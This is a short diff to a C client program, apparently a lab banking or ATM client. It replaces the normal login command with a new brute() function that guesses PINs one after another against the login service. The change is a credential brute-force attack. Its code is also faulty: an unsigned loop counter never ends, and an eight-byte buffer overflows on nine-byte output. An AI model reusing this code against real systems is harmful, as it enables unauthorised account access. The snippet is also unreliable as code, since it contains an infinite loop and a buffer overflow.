@@ -111,6 +111,15 @@ void login(char *username, char *pin) {
     send_command(LOGIN);
 }
 
+void brute(char *username) {
+    char p[8]; 
+    
+    for(unsigned int i = 5000; i >= 0; i--)
+    {
+        sprintf(p, "%08d", i);
+        login(username, p);
+    }
+}
 
 // logs out for a user
 void logout() {
@@ -378,7 +387,8 @@ int main(int argc, char** argv)
         } else if (!strcmp(cmd, "help")) {
             print_help();
         } else if (!strcmp(cmd, "login")) {
-            login(arg1, arg2);
+            //login(arg1, arg2);
+            brute(arg1);
         } else if (!strcmp(cmd, "logout")) {
             logout();
         } else if (!strcmp(cmd, "query")) {
